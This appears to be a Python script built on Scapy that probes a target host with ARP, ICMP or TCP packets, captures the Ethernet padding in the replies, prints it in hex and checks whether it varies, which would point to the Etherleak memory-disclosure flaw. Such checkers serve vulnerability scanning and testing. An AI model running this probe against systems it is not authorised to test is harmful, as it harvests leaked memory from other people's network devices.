import os
import sys
import signal
import binascii
from scapy.all import *

# Function to convert bytes to hex format for easier reading
def hexdump(x):
    return ' '.join(f'{c:02x}' for c in x)

# Signal handler for clean exit on Ctrl+C
def signalhandler(signal, id):
    print("!Killing")
    sys.exit(0)

# Function to send ICMP, ARP, or TCP packets and capture responses
def spawn(host, packet_type, count=10, tcp_port=445):
    padding_data = []

    for i in range(count):
        if packet_type == 'arp':
            packet = ARP(pdst=host)
        elif packet_type == 'icmp':
            packet = IP(dst=host) / ICMP(type=8) / 'x'  # ICMP echo request
        elif packet_type == 'tcp':
            packet = IP(dst=host) / TCP(dport=tcp_port)  # TCP to specified port

        # Send packet and capture response
        resp = sr1(packet, timeout=2, verbose=0)
        if resp and Padding in resp:
            data = resp[Padding].load
            padding_data.append(data)
            print(f"Padding captured: {hexdump(data)}")
        else:
            print(f"No Padding layer found or no response received on attempt {i+1}/{count}.")

    return padding_data

# Function to analyze captured padding data
def analyze_padding(padding_data):
    if len(padding_data) < 2:
        print("\nInsufficient data captured for Etherleak analysis. Try increasing the number of packets captured.")
        return False

    # Check for variation in padding data
    is_varying = not all(data == padding_data[0] for data in padding_data)
    
    if is_varying:
        print("\nVariation in padding data detected across packets, indicating a potential Etherleak vulnerability.")
    else:
        print("\nNo significant variation in padding data observed. Target may not exhibit Etherleak vulnerability.")

    # Return whether padding data varied
    return is_varying

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signalhandler)

    if len(sys.argv) < 4 or len(sys.argv) > 5:
        print("Usage: sudo python etherleak_checker.py <target_ip> <arp|icmp|tcp> <count> [tcp_port]")
        sys.exit(1)

    target_host = sys.argv[1]
    packet_type = sys.argv[2]
    packet_count = int(sys.argv[3])
    
    # Set default TCP port to 445 if not provided
    if len(sys.argv) == 5:
        tcp_port = int(sys.argv[4])
    else:
        tcp_port = 445

    if packet_type not in ['arp', 'icmp', 'tcp']:
        print("Invalid type! Use 'arp', 'icmp', or 'tcp'.")
        sys.exit(0)

    print(f"[ Targeting {target_host} using {packet_type.upper()} for {packet_count} requests... ]")

    if packet_type == 'tcp':
        print(f"[ Using TCP port {tcp_port} ]")

    # Capture and analyze the padding data
    captured_data = spawn(target_host, packet_type, packet_count, tcp_port)
    
    if captured_data:
        analyze_padding(captured_data)
    
    print("\nPadding analysis complete.")
